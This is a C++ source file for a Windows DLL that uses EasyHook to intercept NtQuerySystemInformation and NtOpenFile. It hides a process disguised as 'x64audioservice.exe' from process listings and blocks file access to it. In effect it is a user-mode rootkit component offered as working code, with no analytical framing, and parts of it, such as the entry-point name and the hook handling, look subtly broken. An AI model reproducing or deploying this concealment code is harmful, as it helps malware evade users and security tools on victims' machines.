// Windows Header Files:
#include <windows.h>
#include <winternl.h>
// Hooking library
#include <easyhook.h>

// Setup easyhook
#if _WIN64
#pragma comment(lib, "EasyHook64.lib")
#else
#pragma comment(lib, "EasyHook32.lib")
#endif

// Defines and typedefs
#ifndef UNICODE
#define UNICODE
#endif
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define E404 ((NTSTATUS)0xC000000FL)

typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER Reserved[3];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	ULONG BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessID;
} MY_SYSTEM_PROCESS_INFORMATION, *P_MY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS (WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
				SYSTEM_INFORMATION_CLASS SystemInformationCLass,
				PVOID SystemInformation,
				ULONG SystemInformationLength,
				PULONG ReturnLength);

typedef NTSYSCALLAPI NTSTATUS (WINAPI *PNT_OPEN_FILE)(
				PHANDLE FileHandle,
				ACCESS_MASK DesiredAccess,
				POBJECT_ATTRIBUTES ObjectAttributes,
				PIO_STATUS_BLOCK IoStatusBlock,
				ULONG ShareAccess,
				ULONG OpenOptions
				);
// Target program to hide
const wchar_t* targetExe = L"x64audioservice.exe";

// Addresses of the original functions
PNT_QUERY_SYSTEM_INFORMATION O_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)::GetProcAddress(::GetModuleHandle("ntdll"), "NtQuerySystemInformation");
PNT_OPEN_FILE O_NtOpenFile = (PNT_OPEN_FILE)::GetProcAddress(::GetModuleHandle("ntdll"), "NtOpenFile");

// Hooked functions
NTSTATUS WINAPI H_NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationCLass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	// Run the original function to get some systeminfo
	NTSTATUS result = O_NtQuerySystemInformation(SystemInformationCLass, SystemInformation, SystemInformationLength, ReturnLength);
	// Inspect SystemInformationCLass if it is SystemProcessInformation
	if(result == STATUS_SUCCESS && SystemInformationCLass == SystemProcessInformation)
	{
		// Whoop it's a process info request, which includes all processes
		P_MY_SYSTEM_PROCESS_INFORMATION curr = NULL;
		P_MY_SYSTEM_PROCESS_INFORMATION next = (P_MY_SYSTEM_PROCESS_INFORMATION) SystemInformation;
		
		// Loop through list of proccesses n delete all mentions of x64audioservice.exe
		do
		{
			// Select next process
			curr = next;
			// Find the next next in memory with offset
			next = (P_MY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
			
			// See if the next imageName is x64audioservice.exe
			if(!wcsncmp(next->ImageName.Buffer, targetExe, next->ImageName.Length))
			{
				// Delete this entry
				if(next->NextEntryOffset == 0)
				{
					// Next node is the last node, set current node to last node to ignore it
					curr->NextEntryOffset = 0;
				}
				else
				{
					// Add next->NextEntryOffset to curr->NextEntryOffset to skip next when looping through the array
					curr->NextEntryOffset += next->NextEntryOffset;
				}
				// Mkay now ignore this entry
				next = curr;
			}
		}while(curr->NextEntryOffset != 0);
	}
	return result;
}	

NTSTATUS WINAPI H_NtOpenFile(
				PHANDLE FileHandle,
				ACCESS_MASK DesiredAccess,
				POBJECT_ATTRIBUTES ObjectAttributes,
				PIO_STATUS_BLOCK IoStatusBlock,
				ULONG ShareAccess,
				ULONG OpenOptions)
{
	// Result to return
	NTSTATUS result;
	// Inspect ObjectAttributes, see if our folders are being opened
	if(!wcsncmp(ObjectAttributes->ObjectName->Buffer, targetExe, ObjectAttributes->ObjectName->Length))
	{
		// Folders are being opened, return E404
		result = E404;
	}
	// Else run original function to prevent issues
	else
	{
		result = O_NtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
	}
	return result;
}

// Shutdown handler


// Entry point
BOOL WINAPI DLLMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
{
	// Set up hook handlers
	HOOK_TRACE_INFO queryHook, fileHook;
	queryHook = {NULL};
	fileHook = {NULL};
	switch(reason)
	{
		case DLL_PROCESS_ATTACH:
			// If startup reg key exists, delete it			
			// Hook ntquerysysteminformation function to hide execution
			LhInstallHook((PVOID*) &O_NtQuerySystemInformation, H_NtQuerySystemInformation, NULL, &queryHook);
			// Hook ntopenfile function to hide my directories
			LhInstallHook((PVOID*) &O_NtOpenFile, H_NtOpenFile, NULL, &fileHook);
			// Shutdown handler
		break;
		case DLL_PROCESS_DETACH:
			// Unhook all the functions
			LhUninstallHook(&queryHook);
			LhUninstallHook(&fileHook);
			// Uninstall hooks
			LhWaitForPendingRemovals();
		break;
	}
	
	return TRUE;
}